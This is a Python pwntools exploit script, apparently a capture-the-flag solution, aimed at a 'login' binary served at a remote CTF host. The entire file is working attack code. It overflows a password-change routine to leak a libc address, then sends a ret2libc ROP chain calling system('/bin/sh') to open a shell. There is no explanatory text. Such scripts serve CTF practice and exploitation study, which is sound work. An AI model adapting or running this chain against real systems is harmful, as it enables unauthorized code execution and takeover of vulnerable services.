from pwn import *
from icecream import ic

elf = exe = ELF("./login_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("pwn.1nf1n1ty.team", 31293)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''

c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def gad(a, b): return ROP(a).find_gadget([f"pop " + b, "ret"])[0]
def i(): return io.interactive()

io = start()

def register(username, password):
    sl(b'1')
    sl(username)
    sl(password)

def changepass(id, password, newpass):
    sl(b'3')
    sl(str(id))
    sl(password)
    sl(newpass)





register('aaa', 'bbb')

changepass(0, 'bbb', 'a'*0x2d)
sl(str(0xffffffffffff).encode())

ru("\xef")
libc.address = u64(re(6).ljust(8, b'\x00'))- 0x1d7542

ic(hex(libc.address))

sl(b'1337')

ret = libc.address + 0x000000000002668c
payload = b'a'*408
payload += p64(ret)
payload += p64(gad(libc, "rdi"))
payload += p64(next(libc.search(b"/bin/sh\x00")))
payload += p64(libc.sym['system'])

sl(payload)

io.interactive()
